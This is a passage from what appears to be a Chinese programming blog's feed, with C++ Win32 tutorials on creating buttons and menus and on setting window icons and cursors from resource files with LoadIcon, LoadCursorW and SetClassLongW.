<span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置菜单&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_RBUTTONDOWN:<br>&#123;<br><span class="hljs-comment">/*WORD x = LOWORD(lParam);</span><br><span class="hljs-comment">WORD y = HIWORD(lParam);*/</span><br>POINT point&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">/*point.x = x;</span><br><span class="hljs-comment">point.y = y;*/</span><br><span class="hljs-built_in">GetCursorPos</span>(&amp;point);<br><span class="hljs-comment">//ClientToScreen(hwnd, &amp;point);</span><br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br>HMENU hSubMenu = <span class="hljs-built_in">GetSubMenu</span>(hmenu, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">TrackPopupMenu</span>(hSubMenu,TPM_LEFTALIGN, point.x, point.y,<span class="hljs-number">0</span>,hwnd,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br><span class="hljs-built_in">SetMenu</span>(hwnd, hmenu);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> ID_Menu:<br>&#123;<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;子菜单1&quot;</span>, <span class="hljs-string">L&quot;子菜单1被点击了&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br><span class="hljs-comment">//myClass.hCursor = LoadCursorW(hInstance, MAKEINTRESOURCEW(IDC_CURSOR1));</span><br><span class="hljs-comment">//myClass.lpszMenuName = MAKEINTRESOURCEW(IDR_MENU1);</span><br><br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br><br><span class="hljs-comment">//HMENU hmenu = LoadMenuW(hInstance, MAKEINTRESOURCEW(IDR_MENU1));</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos资源操作1</title>
    <link href="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/"/>
    <url>/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/1.png" alt="1"></p><h2 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h2><p>首先添加一个图标资源</p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/2.png" alt="2"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/3.png" alt="3"></p><blockquote><p>可以导入 也可以新建  这里就新建好了</p></blockquote><blockquote><p>随便画画 点击保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/4.png" alt="4"></p><blockquote><p>保存之后资源文件夹里面会多出两个文件</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/5.png" alt="5"></p><blockquote><p>先暂时不用管 继续操作</p></blockquote><blockquote><p>先要用到LoadIcon()函数  可以按F1进行查看详细信息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HICON <span class="hljs-title">LoadIconA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR    lpIconName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><blockquote><p><strong>参数</strong></p><p>hInstance</p><p>类型：<strong>HINSTANCE</strong></p><p>模块实例的句柄，其可执行文件包含要加载的图标。加载标准图标时，此参数必须为<strong>NULL</strong>。</p><p>lpIconName</p><p>类型：<strong>LPCTSTR</strong></p><p>要加载的图标资源的名称。或者，该参数可以在低位字中包含资源标识符，在高位字中包含零。使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-makeintresourcea">MAKEINTRESOURCE</a>宏创建此值。</p><p><strong>返回值</strong></p><p>类型：<strong>HICON</strong></p><p>如果函数成功，则返回值是新加载图标的句柄。</p><p>如果函数失败，则返回值为<strong>NULL</strong>。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p><strong>备注</strong></p><p><strong>LoadIcon</strong>仅在未加载的情况下加载图标资源；否则，它检索现有资源的句柄。该函数在图标资源中搜索最适合当前显示的图标。图标资源可以是彩色或单色位图。</p><p><strong>LoadIcon</strong>只能加载其大小符合一个图标<strong>SM_CXICON</strong>和<strong>SM_CYICON</strong>系统指标值。使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-loadimagea">LoadImage</a>函数加载其他尺寸的图标。</p></blockquote><p><strong>LoadIcon第二个参数可以在头文件里面看见</strong></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/6.png" alt="6"></p><blockquote><p>但是光直接写还不行 还是会报错 因为图片ID 实际上的值是整形的 而IDI_ICON1 是LPCWSTR形的  所以需要强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/7.png" alt="7"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/8.png" alt="8"></p><blockquote><p>可以用F12查看一下MAKEINTRESOURCE</p></blockquote><blockquote><p>相当于这个宏的作用也是进行强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/9.png" alt="9"></p><blockquote><p>这样写也是可以的</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/10.png" alt="10"></p><blockquote><p>然后设置图标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/11.png" alt="11"></p><blockquote><p>试验一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/12.png" alt="12"></p><blockquote><p>成功变化</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/13.png" alt="13"></p><blockquote><p>也可以在创建的时候直接改变图标的样子</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/14.png" alt="14"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/15.png" alt="15"></p><h2 id="设置鼠标样式"><a href="#设置鼠标样式" class="headerlink" title="设置鼠标样式"></a>设置鼠标样式</h2><blockquote><p>先导入一个鼠标的光标资源</p></blockquote><blockquote><p>操作和上面一样</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/16.png" alt="16"></p><blockquote><p>然后保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/17.png" alt="17"></p><blockquote><p>方式也都和上面的基本类似只是函数改了一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/18.png" alt="18"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/19.png" alt="19"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/20.png" alt="20"></p><blockquote><p>同样也可以创建窗口的时候就改变鼠标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置鼠标&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x105</span>:<br>&#123;<br><span class="hljs-comment">//LPCWSTR</span><br><span class="hljs-comment">//MAKEINTRESOURCE</span><br><span class="hljs-comment">//LoadIcon(hInstance, (LPCWSTR)IDI_ICON1);</span><br>HICON hicon=<span class="hljs-built_in">LoadIcon</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDI_ICON1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd,GCL_HICON,(LONG)hicon);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br><br>HCURSOR hcursor = <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd, GCL_HCURSOR, (LONG)hcursor);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br>myClass.hCursor= <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span 